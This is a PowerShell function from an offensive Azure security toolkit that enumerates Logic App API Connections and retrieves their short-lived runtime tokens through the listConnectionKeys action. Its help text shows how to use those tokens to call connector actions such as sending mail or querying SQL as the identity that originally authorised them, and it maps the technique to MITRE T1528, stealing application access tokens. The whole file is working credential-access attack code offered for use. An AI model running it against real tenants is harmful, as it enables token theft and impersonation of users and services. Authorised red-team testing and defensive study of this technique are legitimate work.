function Get-ApiConnectionToken {
    [CmdletBinding()]
    param (
        [Parameter(
            Mandatory = $false,
            ValueFromPipelineByPropertyName = $true
        )]
        [Alias('resource-id', 'id')]
        [string]$ConnectionId,

        [Parameter(Mandatory = $false, ValueFromPipelineByPropertyName = $true)]
        [Microsoft.Azure.Commands.ResourceManager.Common.ArgumentCompleters.ResourceGroupCompleterAttribute()]
        [Alias('rg', 'resource-group')]
        [string]$ResourceGroupName,

        [Parameter(Mandatory = $false, ValueFromPipelineByPropertyName = $true)]
        [Microsoft.Azure.Commands.ResourceManager.Common.ArgumentCompleters.ResourceNameCompleterAttribute(
            'Microsoft.Web/connections',
            'ResourceGroupName'
        )]
        [Alias('connection-name', 'connection')]
        [string]$Name,

        [Parameter(Mandatory = $false)]
        [ValidateRange(1, 7)]
        [Alias('validity-days')]
        [int]$ValidityDays = 1,

        [Parameter(Mandatory = $false)]
        [ValidateSet('Object', 'JSON', 'CSV', 'Table')]
        [Alias('output', 'o')]
        [string]$OutputFormat = 'Object'
    )

    begin {
        Write-Verbose "Starting function $($MyInvocation.MyCommand.Name)"
        $MyInvocation.MyCommand.Name | Invoke-BlackCat

        $result = New-Object System.Collections.ArrayList
        $stats  = @{
            StartTime    = Get-Date
            Attempted    = 0
            Succeeded    = 0
            Failed       = 0
            Unauthorized = 0
        }
    }

    process {
        try {
            # Resolve connection resource IDs to process
            $targets = @()

            if ($ConnectionId) {
                # Caller supplied a full resource ID directly
                $targets += $ConnectionId
            }
            elseif ($ResourceGroupName -and $Name) {
                # Build resource ID from RG + name + current sub
                $subId    = `
                    $script:SessionVariables.subscriptionId
                $targets += (
                    "/subscriptions/$subId/resourceGroups/" +
                    "$ResourceGroupName/providers/" +
                    "Microsoft.Web/connections/$Name"
                )
            }
            else {
                # Enumerate all connections in scope
                Write-Host (
                    ' No specific connection targeted — ' +
                    'enumerating all accessible connections...'
                ) -ForegroundColor Cyan

                $all = Invoke-AzBatch `
                    -ResourceType 'Microsoft.Web/connections'

                if (-not $all -or $all.Count -eq 0) {
                    Write-Host '  No API Connections found' `
                        -ForegroundColor Yellow
                    return
                }

                $targets = $all.id
                Write-Host "  Found $($targets.Count) connection(s)" `
                    -ForegroundColor Cyan
            }

            $stats.Attempted = $targets.Count
            $validityDays    = $ValidityDays

            Write-Host (
                " Requesting runtime token(s) for " +
                "$($targets.Count) connection(s)..."
            ) -ForegroundColor Green

            foreach ($connId in $targets) {
                try {
                    $sv   = $script:SessionVariables
                    $auth = $script:authHeader

                    # Step 1: GET connection to retrieve metadata
                    # and the connection runtime URL
                    $getUri = '{0}{1}?api-version=2016-06-01' -f `
                        $sv.armUri, $connId

                    $conn = Invoke-RestMethod `
                        -Uri       $getUri `
                        -Headers   $auth `
                        -Method    'GET' `
                        -UserAgent $sv.userAgent

                    $props           = $conn.properties
                    $connectorId     = $props.api.name
                    $connectorName   = $props.api.displayName
                    $runtimeUrl      = $props.connectionRuntimeUrl
                    $authorizedAs    = $props.authenticatedUser.name
                    $connectionName  = $conn.name

                    # Step 2: POST listConnectionKeys to retrieve
                    # a short-lived JWT for the connection runtime.
                    #
                    # validityTimeSpan must be a .NET TimeSpan string
                    # (d.hh:mm:ss). "1" alone is not a valid TimeSpan
                    # and causes a 400 Bad Request.
                    #
                    # Fallback strategy:
                    #   1. preview API  (2018-07-01-preview) + TimeSpan
                    #   2. stable API   (2016-06-01) + empty body
                    $timespan = '{0}.00:00:00' -f $validityDays
                    $body     = @{
                        validityTimeSpan = $timespan
                    } | ConvertTo-Json -Compress

                    $keysResponse = $null

                    # Attempt 1 — preview API with TimeSpan body
                    $keysUri = (
                        '{0}{1}/listConnectionKeys' +
                        '?api-version=2018-07-01-preview'
                    ) -f $sv.armUri, $connId

                    try {
                        $keysResponse = Invoke-RestMethod `
                            -Uri         $keysUri `
                            -Headers     $auth `
                            -Method      'POST' `
                            -Body        $body `
                            -ContentType 'application/json' `
                            -UserAgent   $sv.userAgent
                    }
                    catch {
                        $previewErr = if ($_.ErrorDetails.Message) {
                            $_.ErrorDetails.Message
                        } else { $_.Exception.Message }

                        Write-Verbose (
                            "preview API failed ($previewErr)" +
                            ' — retrying with stable API'
                        )

                        # Attempt 2 — stable API, empty body
                        $keysUri2 = (
                            '{0}{1}/listConnectionKeys' +
                            '?api-version=2016-06-01'
                        ) -f $sv.armUri, $connId

                        $keysResponse = Invoke-RestMethod `
                            -Uri         $keysUri2 `
                            -Headers     $auth `
                            -Method      'POST' `
                            -Body        '{}' `
                            -ContentType 'application/json' `
                            -UserAgent   $sv.userAgent
                    }

                    # Normalise response across API version variants
                    $token    = if ($keysResponse.value) {
                        $keysResponse.value
                    }
                    elseif ($keysResponse.token.token) {
                        $keysResponse.token.token
                    }
                    elseif ($keysResponse.connectionKey) {
                        $keysResponse.connectionKey
                    }
                    else { $null }

                    $notAfter = if ($keysResponse.notAfter) {
                        $keysResponse.notAfter
                    }
                    elseif ($keysResponse.token.notAfter) {
                        $keysResponse.token.notAfter
                    }
                    else { $null }

                    $item = [PSCustomObject]@{
                        'ConnectionName'   = $connectionName
                        'ConnectorId'      = $connectorId
                        'ConnectorDisplay' = $connectorName
                        'AuthorizedAs'     = $authorizedAs
                        'ConnectionStatus' = (
                            $props.statuses |
                            Select-Object -First 1 -ExpandProperty status
                        )
                        'RuntimeUrl'       = $runtimeUrl
                        'Token'            = $token
                        'NotAfter'         = $notAfter
                        'ResourceId'       = $connId
                        'ResourceGroup'    = ($connId -split '/')[4]
                    }

                    [void]$result.Add($item)
                    $stats.Succeeded++

                    Write-Host (
                        "  [+] $connectionName " +
                        "($connectorId) — token retrieved"
                    ) -ForegroundColor Green

                    if ($runtimeUrl) {
                        Write-Host "      Runtime URL: $runtimeUrl" `
                            -ForegroundColor Cyan
                    }
                }
                catch {
                    $errMsg = $_.Exception.Message
                    # $_.ErrorDetails.Message contains the Azure
                    # error JSON body (more informative than the
                    # HTTP status line alone)
                    $errDetail = if ($_.ErrorDetails.Message) {
                        try {
                            $azErr = $_.ErrorDetails.Message |
                                ConvertFrom-Json -ErrorAction Stop
                            $azErr.error.message ?? $azErr.message ??
                                $_.ErrorDetails.Message
                        }
                        catch { $_.ErrorDetails.Message }
                    }
                    else { $null }

                    $displayMsg = if ($errDetail) {
                        "$errMsg — $errDetail"
                    } else { $errMsg }

                    if ($errMsg -match '401|Unauthorized') {
                        Write-Host (
                            "  [-] $connId — " +
                            "Unauthorized (insufficient RBAC): " +
                            $displayMsg
                        ) -ForegroundColor Red
                        $stats.Unauthorized++
                    }
                    elseif ($errMsg -match '403|Forbidden') {
                        Write-Host (
                            "  [-] $connId — " +
                            "Forbidden (action not allowed): " +
                            $displayMsg
                        ) -ForegroundColor Red
                        $stats.Unauthorized++
                    }
                    else {
                        Write-Warning (
                            "Error on $connId`: $displayMsg"
                        )
                        $stats.Failed++
                    }
                }
            }
        }
        catch {
            Write-Message `
                -FunctionName $($MyInvocation.MyCommand.Name) `
                -Message      $($_.Exception.Message) `
                -Severity     'Error'
        }
    }

    end {
        $duration = (Get-Date) - $stats.StartTime

        Write-Host "`n API Connection Token Summary:" `
            -ForegroundColor Magenta
        Write-Host "   Attempted    : $($stats.Attempted)" `
            -ForegroundColor White
        Write-Host "   Retrieved    : $($stats.Succeeded)" `
            -ForegroundColor Green
        Write-Host "   Unauthorized : $($stats.Unauthorized)" `
            -ForegroundColor Red
        Write-Host "   Errors       : $($stats.Failed)" `
            -ForegroundColor Red
        Write-Host (
            "   Duration     : " +
            "$($duration.TotalSeconds.ToString('F2'))s"
        ) -ForegroundColor White

        Write-Verbose "Completed function $($MyInvocation.MyCommand.Name)"

        Format-BlackCatOutput `
            -Data         $result `
            -OutputFormat $OutputFormat `
            -FunctionName $MyInvocation.MyCommand.Name
    }

    <#
    .SYNOPSIS
        Retrieves a runtime token for one or more API Connections.

    .DESCRIPTION
        Calls the ARM listConnectionKeys action on Microsoft.Web/connections
        resources to obtain a short-lived JWT that authorises direct
        interaction with the connection runtime service — without needing
        a Logic App to broker the call.

        The returned token and runtime URL can be used to invoke connector
        actions (send mail, query SQL, read blobs, etc.) as the identity
        that originally authorised the connection.

        This demonstrates that API Connections are independently callable
        trust grants, not Logic App-specific credentials.

        AUTHORISED SECURITY TESTING ONLY. Requires:
        - Microsoft.Web/connections/read
        - Microsoft.Web/connections/listConnectionKeys/action
          (typically held by Contributor or Logic App Contributor)

        Usage pattern after token retrieval:
          $headers = @{ Authorization = "Bearer $($token.Token)" }
          Invoke-RestMethod -Uri "$($token.RuntimeUrl)/..." `
              -Headers $headers -Method Post

    .PARAMETER ConnectionId
        Full ARM resource ID of the connection to target. If omitted
        alongside -Name/-ResourceGroupName, all accessible connections
        are processed.

    .PARAMETER ResourceGroupName
        Resource group containing the target connection. Use with -Name.

    .PARAMETER Name
        Name of the target connection resource. Use with -ResourceGroupName.

    .PARAMETER ValidityDays
        Token validity period in days (1–7). Default is 1.

    .PARAMETER OutputFormat
        Output format: Object (default), JSON, CSV, Table.

    .EXAMPLE
        Get-ApiConnectionToken

        Attempts to retrieve runtime tokens for every API Connection
        in the current subscription, showing which ones are accessible
        with the current identity's RBAC permissions.

    .EXAMPLE
        Get-ApiConnectionToken -ResourceGroupName 'rg-int' `
            -Name 'office365-connection'

        Retrieves the runtime token for a specific Office 365 connection.

    .EXAMPLE
        $t = Get-ApiConnection -MinRiskLevel High |
             Select-Object -First 1 |
             Get-ApiConnectionToken
        $headers = @{ Authorization = "Bearer $($t.Token)" }
        Invoke-RestMethod -Uri "$($t.RuntimeUrl)/..." `
            -Headers $headers -Method Post

        Chains Get-ApiConnection discovery into token retrieval, then
        uses the token to call the connection runtime directly.

    .EXAMPLE
        Get-ApiConnectionToken -OutputFormat JSON

        Exports all retrievable token metadata to a timestamped JSON file.

    .OUTPUTS
        [PSCustomObject]
        Each object contains:
        - ConnectionName: Resource name of the connection
        - ConnectorId: API name (e.g. "office365", "sql")
        - ConnectorDisplay: Human-readable connector name
        - AuthorizedAs: Identity that originally consented
        - ConnectionStatus: Connected | Error | Unauthenticated
        - RuntimeUrl: Connection runtime URL (call target)
        - Token: Short-lived JWT for the runtime service
        - NotAfter: Token expiry (ISO 8601)
        - ResourceId: Full ARM resource ID
        - ResourceGroup: Containing resource group

    .NOTES
        Author: BlackCat Security Framework
        Requires: ARM access (Az.Accounts)

        Required RBAC actions:
        - Microsoft.Web/connections/read
        - Microsoft.Web/connections/listConnectionKeys/action

        The listConnectionKeys action is included in:
        - Contributor
        - Logic App Contributor
        - Any role with Microsoft.Web/connections/* actions

    .LINK
        MITRE ATT&CK Tactic: TA0006 - Credential Access
        https://attack.mitre.org/tactics/TA0006/

    .LINK
        MITRE ATT&CK Technique: T1528 - Steal Application Access Token
        https://attack.mitre.org/techniques/T1528/
    #>
}
